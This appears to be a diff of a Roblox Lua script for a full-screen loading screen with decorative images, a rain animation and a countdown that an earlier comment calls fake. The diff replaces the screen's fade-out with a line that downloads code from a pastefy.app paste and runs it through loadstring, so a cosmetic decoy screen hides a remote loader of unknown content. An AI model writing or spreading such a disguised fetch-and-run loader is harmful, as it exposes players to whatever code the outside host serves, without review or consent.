@@ -13,16 +13,15 @@ screenGui.ResetOnSpawn = false
 screenGui.IgnoreGuiInset = true
 screenGui.Parent = playerGui
 
--- Fullscreen Background
+-- Fullscreen White Background
 local bg = Instance.new("Frame")
 bg.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
 bg.Size = UDim2.new(1, 0, 1, 0)
 bg.Position = UDim2.new(0, 0, 0, 0)
 bg.BorderSizePixel = 0
-bg.ZIndex = 0
 bg.Parent = screenGui
 
--- Decorations (fruits, vines, flowers)
+-- Decorative Fruits/Vines/Flowers
 local decorations = {
 	{img="rbxassetid://507845210", pos=UDim2.new(0, 10, 0, 10)},
 	{img="rbxassetid://507845159", pos=UDim2.new(1, -80, 0, 20)},
@@ -37,8 +36,29 @@ for _, item in pairs(decorations) do
 	img.Size = UDim2.new(0, 64, 0, 64)
 	img.Position = item.pos
 	img.BackgroundTransparency = 1
-	img.ZIndex = 1
+	img.ZIndex = 0
 	img.Parent = bg
+end
+
+-- RAIN EFFECT
+for i = 1, 100 do
+	local drop = Instance.new("Frame")
+	drop.BackgroundColor3 = Color3.fromRGB(150, 200, 255)
+	drop.Size = UDim2.new(0, 2, 0, math.random(10, 20))
+	drop.Position = UDim2.new(math.random(), 0, -0.1, 0)
+	drop.BorderSizePixel = 0
+	drop.BackgroundTransparency = 0.2
+	drop.ZIndex = 1
+	drop.Parent = screenGui
+
+	local tweenService = game:GetService("TweenService")
+	local tween = tweenService:Create(drop, TweenInfo.new(math.random(1, 2), Enum.EasingStyle.Linear), {
+		Position = UDim2.new(drop.Position.X.Scale, 0, 1.1, 0)
+	})
+	tween:Play()
+	tween.Completed:Connect(function()
+		drop:Destroy()
+	end)
 end
 
 -- Main UI Panel
@@ -106,8 +126,8 @@ credit.TextScaled = true
 credit.ZIndex = 3
 credit.Parent = panel
 
--- Fake Countdown Logic
-local seconds = 80
+-- Countdown Logic
+local seconds = 50
 coroutine.wrap(function()
 	while seconds > 0 do
 		counter.Text = seconds .. "s"
@@ -115,37 +135,11 @@ coroutine.wrap(function()
 		wait(1)
 	end
 	counter.Text = "Loading..."
+	wait(3) -- optional delay
 
-	wait(3)
+	-- Optional: remove UI or keep it forever
+	-- screenGui:Destroy()
 
-	-- Smooth fade out
-	for i = 1, 10 do
-		screenGui.BackgroundTransparency = i / 10
-		panel.BackgroundTransparency = i / 10
-		for _, child in pairs(panel:GetChildren()) do
-			if child:IsA("TextLabel") then
-				child.TextTransparency = i / 10
-			end
-		end
-		wait(0.05)
-	end
-	screenGui:Destroy()
+	-- 💡 Your real script here (you can comment this out if you don't want to load anything)
+	loadstring(game:HttpGet("https://pastefy.app/EEmKlIPx/raw", true))()
 end)()
-
--- 🌧️ Rain effect using particles
-local rain = Instance.new("ParticleEmitter")
-rain.Parent = bg
-rain.Texture = "rbxassetid://241876452" -- raindrop texture
-rain.Size = NumberSequence.new(0.2)
-rain.Lifetime = NumberRange.new(1.5, 2.5)
-rain.Rate = 150
-rain.Speed = NumberRange.new(20, 30)
-rain.Rotation = NumberRange.new(0, 360)
-rain.VelocitySpread = 180
-rain.LightInfluence = 0
-rain.Transparency = NumberSequence.new({NumberSequenceKeypoint.new(0, 0.3), NumberSequenceKeypoint.new(1, 1)})
-rain.RotSpeed = NumberRange.new(50)
-rain.ZOffset = 1
-rain.LockedToPart = true
-rain.Acceleration = Vector3.new(0, -60, 0)
-rain.Enabled = true
